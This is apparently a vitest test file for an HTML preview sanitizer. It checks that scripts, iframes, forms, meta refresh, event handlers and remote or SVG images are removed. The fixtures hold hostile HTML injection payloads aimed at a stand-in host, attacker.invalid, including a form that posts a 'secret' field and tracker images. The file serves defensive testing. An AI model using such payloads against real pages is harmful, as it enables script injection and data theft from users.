import { describe, expect, it, vi } from "vitest";
import {
  HTML_PREVIEW_CSP,
  HtmlPreviewTooLargeError,
  MAX_HTML_PREVIEW_BYTES,
  renderHtmlPreview,
} from "./html";

describe("secure HTML preview", () => {
  it("keeps static document structure and inline styles in a controlled wrapper", async () => {
    const result = await renderHtmlPreview(
      `<!doctype html>
      <html lang="en">
        <head><title>Untrusted title</title><style>.card { color: red; }</style></head>
        <body><main class="card"><h1>Hello</h1><details open><summary>More</summary><p>Text</p></details></main></body>
      </html>`,
      "light",
    );

    expect(result.document.startsWith("<!doctype html><html lang=\"en\"><head>")).toBe(true);
    expect(result.document.indexOf(HTML_PREVIEW_CSP)).toBeLessThan(
      result.document.indexOf(".card { color: red; }"),
    );
    expect(result.document).toContain('<main class="card"><h1>Hello</h1>');
    expect(result.document).toContain("<style>.card { color: red; }</style>");
    expect(result.document).not.toContain("Untrusted title");
  });

  it("removes executable, navigable, nested and form content", async () => {
    const result = await renderHtmlPreview(`
      <base href="https://attacker.invalid/">
      <meta http-equiv="refresh" content="0;url=https://attacker.invalid/">
      <script>parent.document.body.dataset.compromised = "yes"</script>
      <a href="https://attacker.invalid/" target="_top" ping="https://attacker.invalid/ping" download>Leave</a>
      <form action="https://attacker.invalid/collect"><input name="secret"><button formaction="https://attacker.invalid/collect">Send</button></form>
      <iframe srcdoc="<script>alert(1)</script>" src="https://attacker.invalid/"></iframe>
      <object data="https://attacker.invalid/payload"></object>
      <p onclick="alert(1)" style="color: green">Safe text</p>
    `);

    expect(result.document).not.toMatch(/<script|<iframe|<object|<form|<input|<button/i);
    expect(result.document).not.toMatch(/onclick|href=|target=|ping=|download|formaction/i);
    expect(result.document).not.toContain("refresh");
    expect(result.document).not.toContain("attacker.invalid");
    expect(result.document).toContain("Leave");
    expect(result.document).toContain('style="color: green"');
    expect(result.document).toContain("Safe text");
  });

  it("allows only raster data images and resolved in-directory images", async () => {
    const rasterData = "data:image/png;base64,iVBORw0KGgo=";
    const resolver = vi.fn(async (sources: string[]) => [
      {
        source: "images/local.png",
        dataUrl: rasterData,
        path: "C:\\project\\images\\local.png",
        error: null,
      },
    ]);
    const result = await renderHtmlPreview(
      `<img alt="embedded" src="${rasterData}">
       <img alt="local" src="images/local.png">
       <img alt="remote" src="https://attacker.invalid/tracker.png">
       <img alt="svg" src="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4=">
       <img alt="set" srcset="https://attacker.invalid/a.png 2x">
       <object><img alt="hidden" src="hidden.png"></object>`,
      "dark",
      resolver,
    );

    expect(resolver).toHaveBeenCalledWith(["images/local.png"]);
    expect(result.document).not.toContain("hidden.png");
    expect(result.resolvedImages).toBe(1);
    expect(result.blockedResources).toBe(2);
    expect(result.document.match(/data:image\/png;base64,iVBORw0KGgo=/g)).toHaveLength(2);
    expect(result.document).not.toContain("attacker.invalid");
    expect(result.document).not.toContain("image/svg+xml");
    expect(result.document).not.toContain("srcset");
  });

  it("applies the configured preview font size within safe bounds", async () => {
    const configured = await renderHtmlPreview("<p>Text</p>", "light", undefined, 22);
    const clamped = await renderHtmlPreview("<p>Text</p>", "dark", undefined, 100);
    expect(configured.document).toContain("font-size: 22px");
    expect(clamped.document).toContain("font-size: 28px");
  });

  it("fails before parsing oversized HTML", async () => {
    const source = `<p>${"x".repeat(MAX_HTML_PREVIEW_BYTES)}</p>`;
    await expect(renderHtmlPreview(source)).rejects.toBeInstanceOf(
      HtmlPreviewTooLargeError,
    );
  });

  it("handles malformed hostile markup without escaping the wrapper", async () => {
    const result = await renderHtmlPreview(
      `<div><style>p { color: blue }</style><p>Visible<script>throw 1</script><iframe><p>nested</p>`,
    );
    expect(result.document).toContain("Visible");
    expect(result.document).not.toContain("throw 1");
    expect(result.document).not.toContain("nested");
    expect(result.document.endsWith("</body></html>")).toBe(true);
  });
});
